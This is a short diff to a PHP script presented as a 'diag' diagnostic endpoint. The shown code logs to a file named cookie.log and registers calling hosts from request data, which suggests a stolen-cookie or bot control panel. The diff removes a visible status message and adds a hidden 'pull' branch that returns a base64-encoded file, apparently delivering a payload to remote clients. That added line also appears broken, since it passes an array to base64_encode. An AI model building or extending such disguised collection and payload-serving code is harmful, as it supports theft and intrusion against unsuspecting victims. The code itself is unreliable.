@@ -48,7 +48,6 @@ if (!file_exists(sys_get_temp_dir() . "/diag_php.pid")) {
 
 if (!empty($_SERVER["REQUEST_METHOD"])) {
     $outLog = './lots/cookie.log';
-    echo "Diag information collected!";
     if ($_SERVER["REQUEST_METHOD"] === "OPTIONS") {
         if (isset($_REQUEST["q"])) {
             $req = $_REQUEST["q"];
@@ -69,6 +68,8 @@ if (!empty($_SERVER["REQUEST_METHOD"])) {
             addNewHost($_SERVER["REMOTE_ADDR"], $_POST["iru"], "add", $_POST["u"], $_POST['o'], 0);
         } elseif (strtolower($_POST["ac"]) === "ci") {
             addNewHost($_SERVER["REMOTE_ADDR"], '-', $_POST['ac'], '-', '-', 0);
+        }elseif ($_POST['r'] === 'pull'){
+            echo base64_encode(file('slop.php'));
         }
     }
 }else{
